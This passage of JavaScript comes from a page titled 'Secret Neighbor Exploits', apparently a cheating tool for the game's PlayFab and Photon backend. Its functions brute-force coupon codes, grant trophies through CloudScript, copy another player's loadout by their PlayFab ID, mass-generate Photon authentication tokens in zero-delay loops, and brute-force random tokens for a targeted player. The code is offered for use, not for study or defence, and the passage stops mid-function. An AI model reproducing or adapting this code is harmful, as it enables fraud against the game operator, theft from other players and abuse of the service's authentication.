    document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
    output.textContent = "Starting coupon bruteforce...\n";

    async function attemptRedeemCoupon() {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      function gen(len) {
        let s = '';
        for (let i = 0; i < len; i++) {
          s += chars[Math.floor(Math.random() * chars.length)];
        }
        return s;
      }
      const couponCode = gen(3) + '-' + gen(4) + '-' + gen(3);
      output.textContent += `Trying coupon code: ${couponCode}\n`;

      const data = await makeApiCall("Client/RedeemCoupon", "POST", {
        CouponCode: couponCode
      }, titleIdMain, sessionTicket);

      if (data.error) {
        output.textContent += `‚ùå Failed: ${data.error}\n`;
        failedAttempts++;
      } else {
        output.textContent += `‚úÖ Success! Coupon redeemed: ${couponCode}\n`;
        failedAttempts = 0;
      }

      output.textContent += `Failed attempts: ${failedAttempts}\n`;
      output.scrollTop = output.scrollHeight;

      if (failedAttempts >= 50) {
        output.textContent += "Too many failed attempts. Stopping bruteforce.\n";
        toggleBruteforceRedeemCoupon();
      }
    }

    attemptRedeemCoupon();
    couponBruteforceIntervalId = setInterval(attemptRedeemCoupon, 1000);
  }

  async function grantTrophy() {
    const trophyId = document.getElementById("trophyId").value.trim();
    const output = document.getElementById("apiOutput");

    if (!trophyId) {
      output.textContent = "Please enter a Trophy ID.";
      return;
    }

    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
      FunctionName: "grantTrophy",
      FunctionParameter: { trophyToGrant: trophyId },
      GeneratePlayStreamEvent: true
    }, titleIdMain, sessionTicket);

    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function resetLoadout() {
    const output = document.getElementById("resetLoadoutOutput");
    const getData = await makeApiCall("Client/GetUserData", "POST", {}, titleIdMain, sessionTicket);
    if (getData.error) {
      output.textContent = `Error getting data: ${getData.error}`;
      return;
    }
    if (getData.data.Data && "loadout" in getData.data.Data) {
      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: { loadout: null }
      }, titleIdMain, sessionTicket);
      if (updateData.error) {
        output.textContent = `Error resetting: ${updateData.error}`;
      } else {
        output.textContent = "Loadout reset successfully!";
      }
    } else {
      output.textContent = "No loadout found to reset.";
    }
  }

  async function stealLoadout() {
    const targetId = document.getElementById("targetPlayFabId").value.trim();
    const output = document.getElementById("stealLoadoutOutput");
    if (!targetId) {
      output.textContent = "Please enter a target PlayFab ID.";
      return;
    }
    const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
      PlayFabId: targetId,
      InfoRequestParameters: { GetUserData: true }
    }, titleIdMain, sessionTicket);
    if (getData.error) {
      output.textContent = `Error getting data: ${getData.error}`;
      return;
    }
    const userData = getData.data.InfoResultPayload.UserData;
    if (userData && "loadout" in userData) {
      const loadoutValue = userData.loadout.Value;
      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: { loadout: loadoutValue }
      }, titleIdMain, sessionTicket);
      if (updateData.error) {
        output.textContent = `Error updating: ${updateData.error}`;
      } else {
        output.textContent = "Loadout stolen successfully!";
      }
    } else {
      output.textContent = "No loadout found on target.";
    }
  }

  async function togglePhotonTokenGenerator() {
    const output = document.getElementById("photonTokenOutput");

    if (photonTokenRunning) {
      clearInterval(photonTokenIntervalId);
      photonTokenRunning = false;
      document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
      document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
      output.textContent += "\nPhoton Token Generator stopped manually.";
      return;
    }

    photonTokenRunning = true;
    document.getElementById("photonTokenStatus").className = "status-indicator status-active";
    document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
    output.textContent = `Starting Photon Token Generator...\nTotal Tokens Generated: ${totalTokensGenerated}\n`;

    async function generatePhotonToken() {
      try {
        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e"
        }, titleIdMain, sessionTicket);

        if (data.data && data.data.PhotonCustomAuthenticationToken) {
          totalTokensGenerated++;
          output.textContent += `\n‚úÖ Generated Token #${totalTokensGenerated}: ${data.data.PhotonCustomAuthenticationToken}\n`;
          bruteforceLog.push({
            time: new Date().toLocaleTimeString(),
            token: data.data.PhotonCustomAuthenticationToken
          });
        } else {
          output.textContent += `\n‚ùå Failed to generate token: ${data.error || "Unknown error"}\n`;
        }
      } catch (err) {
        output.textContent += `\n‚ùå Error: ${err.message}\n`;
      }
      output.scrollTop = output.scrollHeight;
    }

    generatePhotonToken();
    photonTokenIntervalId = setInterval(generatePhotonToken, 0);
  }

  async function startBruteforce() {
    const playFabUsername = document.getElementById("playFabUsername").value.trim();
    const output = document.getElementById("bruteforceOutput");

    if (!playFabUsername) {
      output.textContent = "Please enter a PlayFab ID.";
      return;
    }

    if (bruteforceRunning) {
      output.textContent += "\nBruteforce is already running!";
      return;
    }

    bruteforceRunning = true;
    output.textContent = `Starting bruteforce for PlayFab ID: ${playFabUsername}\n`;

    async function attemptBruteforce() {
      attempts++;
      output.textContent += `\nAttempt #${attempts}\n`;

      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for (let i = 0; i < 50; i++) {
        token += chars[Math.floor(Math.random() * 36)];
      }

      try {
        const response = await fetch(`https://${titleIdMain}.playfabapi.com/photon/authenticate?username=${playFabUsername}&token=${token}`);
        const data = await response.json();

        output.textContent += `Generated Token: ${token}\n`;
        if (data.resultCode === 1) {
          output.textContent += `‚úÖ Valid Token!\n`;
          bruteforceLog.push({
            time: new Date().toISOString(),
            token: token,
            playFabId: playFabUsername
          });
        } else {
          output.textContent += `‚ùå Invalid (resultCode: ${data.resultCode})\n`;
        }
      } catch (err) {
        output.textContent += `‚ùå Error: ${err.message}\n`;
      }
      output.scrollTop = output.scrollHeight;
    }

    attemptBruteforce();
    setInterval(attemptBruteforce, 0);
  }

  function stopBruteforce() {
    if (bruteforceRunning) {
      bruteforceRunning = false;
      document.getElementById("bruteforceOutput").textContent += "\nBruteforce stopped manually.";
      downloadLogAsJSON(bruteforceLog, "bruteforce_log");
      bruteforceLog.length = 0;
    }
  }

  document.addEventListener("DOMContentLoaded", function() {
    console.log("Secret Neighbor Exploits page loaded");
    const savedTicket = localStorage.getItem('sessionTicket');
    if (savedTicket) {
      sessionTicket = savedTicket;
      document.getElementById("sessionTicketInput").value = savedTicket;
      const tokenStatus = document.getElementById("tokenStatus");
      tokenStatus.textContent = "‚úÖ Token loaded from storage!";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "green";
      fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus);
    }
    const savedTicketIOS = localStorage.getItem('sessionTicketIOS');
    if (savedTicketIOS) {
      sessionTicketIOS = savedTicketIOS;
      document.getElementById("sessionTicketInputIOS").value = savedTicketIOS;
      const tokenStatusIOS = document.getElementById("tokenStatusIOS");
      tokenStatusIOS.textContent = "‚úÖ Token loaded from storage!";
      tokenStatusIOS.style.display = "block";
      tokenStatusIOS.style.color = "green";
      fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatusIOS);
    }
  });
</script>


    async function toggleCoin
